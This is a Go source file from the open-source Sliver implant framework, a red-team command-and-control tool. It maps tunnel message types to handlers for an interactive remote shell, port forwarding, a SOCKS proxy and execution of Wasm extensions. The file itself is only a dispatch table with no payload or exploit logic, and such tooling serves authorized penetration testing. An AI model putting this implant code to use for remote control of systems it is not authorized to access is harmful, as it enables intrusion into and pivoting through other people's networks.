package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/handlers/tunnel_handlers"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	tunnelHandlers = map[uint32]TunnelHandler{

		// Interactive shell tunnels
		sliverpb.MsgShellReq: tunnel_handlers.ShellReqHandler,

		// Network tunnels
		sliverpb.MsgPortfwdReq: tunnel_handlers.PortfwdReqHandler,
		sliverpb.MsgSocksData:  tunnel_handlers.SocksReqHandler,

		// Wasm Extensions can be  executed interactively
		sliverpb.MsgExecWasmExtensionReq: tunnel_handlers.ExecWasmExtensionHandler,

		// Data and close messages
		sliverpb.MsgTunnelData:  tunnel_handlers.TunnelDataHandler,
		sliverpb.MsgTunnelClose: tunnel_handlers.TunnelCloseHandler,
	}
)

// GetTunnelHandlers - Returns a map of tunnel handlers
func GetTunnelHandlers() map[uint32]TunnelHandler {
	// {{if .Config.Debug}}
	log.Printf("[tunnel] Tunnel handlers %v", tunnelHandlers)
	// {{end}}
	return tunnelHandlers
}
